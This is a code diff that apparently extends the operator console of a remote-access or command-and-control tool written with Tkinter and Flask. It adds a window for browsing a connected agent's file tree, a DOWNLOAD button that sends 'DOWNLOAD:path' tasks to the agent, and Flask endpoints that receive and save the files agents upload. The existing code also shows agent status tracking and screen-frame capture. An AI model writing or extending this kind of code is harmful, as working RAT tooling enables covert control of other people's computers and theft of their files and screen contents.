@@ -15,7 +15,10 @@ import os as oos
 
 log_queue = queue.Queue()
 image_queue = queue.Queue()
+file_tree_queue = queue.Queue()
+download_queue = queue.Queue()
 agent_windows = {}
+file_windows = {}
 streaming_agents = set()
 OFFLINE_TIMEOUT = 15
 OFFLINE_CHECK_PERIOD = 5
@@ -101,6 +104,139 @@ def open_image_window(agent_id, label, img_bytes, task):
     request_next()
 
 
+def open_file_window(agent_id, tree):
+    if agent_id in file_windows:
+        try:
+            file_windows[agent_id]["win"].lift()
+            return
+        except tk.TclError:
+            pass
+
+    user = get_user(agent_id)
+    label = user.name if user else agent_id
+    ip = user.ip if user else ""
+
+    win = tk.Toplevel(root)
+    win.title(f"Files — {label}")
+    win.geometry("820x520")
+    win.configure(bg="#0D0D0D")
+    win.resizable(False, False)
+
+    header = tk.Frame(win, bg="#111111", highlightthickness=0)
+    header.pack(fill="x")
+    tk.Label(header, text=f"  {label}   {ip}", bg="#111111", fg="#555555", font=("Menlo", 10)).pack(side="left", pady=7)
+    tk.Frame(win, bg="#2A2A2A", height=1, highlightthickness=0).pack(fill="x")
+
+    tk.Frame(win, bg="#2A2A2A", height=1, highlightthickness=0).pack(side="bottom", fill="x")
+    bottom_frame = tk.Frame(win, bg="#111111", highlightthickness=0)
+    bottom_frame.pack(side="bottom", fill="x", ipady=8)
+
+    tree_frame = tk.Frame(win, bg="#0D0D0D", highlightthickness=0)
+    tree_frame.pack(fill="both", expand=True, padx=10, pady=(8, 0))
+
+    y_scroll = ttk.Scrollbar(tree_frame, orient="vertical")
+    y_scroll.pack(side="right", fill="y")
+
+    file_tree_widget = ttk.Treeview(
+        tree_frame,
+        columns=("path", "ftype"),
+        yscrollcommand=y_scroll.set,
+        selectmode="browse"
+    )
+    file_tree_widget.heading("#0", text="Name", anchor="w")
+    file_tree_widget.column("#0", width=760, minwidth=200, stretch=True)
+    file_tree_widget.column("path", width=0, minwidth=0, stretch=False)
+    file_tree_widget.column("ftype", width=0, minwidth=0, stretch=False)
+    file_tree_widget.tag_configure("dir", foreground="#FFAA00")
+    file_tree_widget.tag_configure("file", foreground="#CCCCCC")
+    file_tree_widget.pack(side="left", fill="both", expand=True)
+
+    y_scroll.config(command=file_tree_widget.yview)
+
+    def format_size(size):
+        if size < 1024:
+            return f"{size} B"
+        elif size < 1024 * 1024:
+            return f"{size / 1024:.1f} KB"
+        return f"{size / (1024 * 1024):.1f} MB"
+
+    def populate(parent, node):
+        if node["type"] == "dir":
+            item = file_tree_widget.insert(
+                parent, "end",
+                text=node["name"],
+                values=(node["path"], "dir"),
+                tags=("dir",),
+                open=False
+            )
+            for child in node.get("children", []):
+                populate(item, child)
+        else:
+            size_str = format_size(node.get("size", 0))
+            file_tree_widget.insert(
+                parent, "end",
+                text=f"{node['name']}  ({size_str})",
+                values=(node["path"], "file"),
+                tags=("file",)
+            )
+
+    populate("", tree)
+
+    path_var = tk.StringVar(value="")
+    status_var = tk.StringVar(value="")
+
+    tk.Label(
+        bottom_frame, textvariable=path_var,
+        bg="#111111", fg="#444444", font=("Menlo", 9), anchor="w"
+    ).pack(side="left", padx=(12, 0), fill="x", expand=True)
+
+    tk.Label(
+        bottom_frame, textvariable=status_var,
+        bg="#111111", fg="#00FF88", font=("Menlo", 9)
+    ).pack(side="left", padx=8)
+
+    def on_select(_event):
+        selected = file_tree_widget.selection()
+        if selected:
+            values = file_tree_widget.item(selected[0], "values")
+            if values:
+                path_var.set(values[0])
+
+    file_tree_widget.bind("<<TreeviewSelect>>", on_select)
+
+    def on_download():
+        selected = file_tree_widget.selection()
+        if not selected:
+            log("[-] No file selected")
+            return
+        values = file_tree_widget.item(selected[0], "values")
+        if not values or values[1] != "file":
+            status_var.set("Select a file, not a folder")
+            return
+        path = values[0]
+        u = get_user(agent_id)
+        if u:
+            u.add_task(f"DOWNLOAD:{path}")
+            log(f"[*] Download queued: {path}")
+            status_var.set("Downloading...")
+
+    tk.Button(
+        bottom_frame, text="DOWNLOAD",
+        command=on_download,
+        bg="#1A1A1A", fg="#FFAA00",
+        activebackground="#2A2A2A", activeforeground="#FFAA00",
+        relief="flat", highlightthickness=0, highlightbackground="#111111",
+        padx=15, pady=5, cursor="hand2"
+    ).pack(side="right", padx=(8, 12))
+
+    def on_close():
+        file_windows.pop(agent_id, None)
+        win.destroy()
+
+    win.protocol("WM_DELETE_WINDOW", on_close)
+    file_windows[agent_id] = {"win": win, "status_var": status_var}
+
+
 def render():
     global root, console
 
@@ -154,7 +290,11 @@ def render():
     style.theme_use("clam")
     style.configure("Treeview", background="#0D0D0D", foreground="#FFFFFF", fieldbackground="#0D0D0D", rowheight=28, bordercolor="#444444", borderwidth=1, relief="solid")
     style.configure("Treeview.Heading", background="#111111", foreground="#AAAAAA", relief="flat")
-    style.map("Treeview", background=[("selected", "#1E1E1E")], foreground=[("selected", "#FFFFFF")])
+    style.map("Treeview", background=[("selected", "#1E1E1E")])
+    style.configure("Vertical.TScrollbar", background="#333333", troughcolor="#1A1A1A", bordercolor="#333333", arrowcolor="#888888", relief="flat")
+    style.configure("Horizontal.TScrollbar", background="#333333", troughcolor="#1A1A1A", bordercolor="#333333", arrowcolor="#888888", relief="flat")
+    style.map("Vertical.TScrollbar", background=[("active", "#555555")])
+    style.map("Horizontal.TScrollbar", background=[("active", "#555555")])
 
     connections_table = ttk.Treeview(
         active_frame,
@@ -177,8 +317,27 @@ def render():
 
     connections_table.tag_configure("online", foreground="#00FF88")
     connections_table.tag_configure("offline", foreground="#FF4444")
+    connections_table.tag_configure("online_sel", foreground="#00FF88", background="#1E1E1E")
+    connections_table.tag_configure("offline_sel", foreground="#FF4444", background="#1E1E1E")
 
     connections_table.pack(fill="both", expand=True, padx=15, pady=10)
+
+    selected_agent = [None]
+
+    def on_row_click(event):
+        item = connections_table.identify_row(event.y)
+        if not item:
+            return
+        old = selected_agent[0]
+        selected_agent[0] = item
+        if old and connections_table.exists(old):
+            old_tags = list(connections_table.item(old, "tags"))
+            connections_table.item(old, tags=[t.replace("_sel", "") for t in old_tags])
+        cur_tags = list(connections_table.item(item, "tags"))
+        connections_table.item(item, tags=[t if t.endswith("_sel") else t + "_sel" for t in cur_tags])
+        return "break"
+
+    connections_table.bind("<ButtonPress-1>", on_row_click)
 
     # =========================
     # Actions
@@ -187,14 +346,10 @@ def render():
     actions_frame.pack(side="bottom", pady=(0, 15))
 
     def get_selected_agent_id():
-        selected = connections_table.selection()
-
-        if not selected:
+        if not selected_agent[0]:
             log("[-] No agent selected")
             return None
-
-
-        return selected[0]
+        return selected_agent[0]
 
     def send_ui_task(task_name):
         agent_id = get_selected_agent_id()
@@ -272,14 +427,16 @@ def render():
 
 
     def update_connections_list():
-        selected = connections_table.selection()
-        selected_id = selected[0] if selected else None
+        selected_id = selected_agent[0]
 
         for item in connections_table.get_children():
             connections_table.delete(item)
 
         for user in users:
-            status_tag = "online" if user.status == "online" else "offline"
+            if user.status == "online":
+                status_tag = "online_sel" if user.id == selected_id else "online"
+            else:
+                status_tag = "offline_sel" if user.id == selected_id else "offline"
 
             connections_table.insert(
                 "",
@@ -294,10 +451,6 @@ def render():
                 ),
                 tags=(status_tag,)
             )
-
-        if selected_id and connections_table.exists(selected_id):
-            connections_table.selection_set(selected_id)
-            connections_table.focus(selected_id)
 
         root.after(1000, update_connections_list)
 
@@ -319,9 +472,28 @@ def render():
             open_image_window(agent_id, label, img_bytes, task)
         root.after(500, check_image_queue)
 
+    def check_file_queue():
+        while not file_tree_queue.empty():
+            agent_id, tree = file_tree_queue.get()
+            open_file_window(agent_id, tree)
+        root.after(500, check_file_queue)
+
+    def check_download_queue():
+        while not download_queue.empty():
+            agent_id, filename, save_path = download_queue.get()
+            log(f"[+] File saved: {save_path}")
+            if agent_id in file_windows:
+                try:
+                    file_windows[agent_id]["status_var"].set(f"Saved: {filename}")
+                except tk.TclError:
+                    pass
+        root.after(500, check_download_queue)
+
     update_connections_list()
     update_console()
     check_image_queue()
+    check_file_queue()
+    check_download_queue()
 
     root.mainloop()
 def log(message):
@@ -399,6 +571,33 @@ def screen():
 
     image_queue.put((id, label, img_bytes, "SCREEN"))
     log(f"    > Frame received from {request.remote_addr}")
+    return "OK"
+
+
+@app.route("/files", methods=["POST"])
+def receive_files():
+    data = request.get_json()
+    if not data:
+        return jsonify({"error": "missing data"}), 400
+    agent_id = data.get("id")
+    tree = data.get("tree")
+    file_tree_queue.put((agent_id, tree))
+    log(f"    -> File tree received from {request.remote_addr}")
+    return "OK"
+
+
+@app.route("/download", methods=["POST"])
+def receive_download():
+    agent_id = request.form.get("id")
+    file = request.files.get("file")
+    if not file or not agent_id:
+        return jsonify({"error": "missing data"}), 400
+    oos.makedirs("downloads", exist_ok=True)
+    filename = file.filename or f"file_{time.time()}"
+    save_path = oos.path.join("downloads", f"{agent_id}_{filename}")
+    file.save(save_path)
+    log(f"    -> Downloaded: {filename} from {request.remote_addr}")
+    download_queue.put((agent_id, filename, save_path))
     return "OK"
 
 
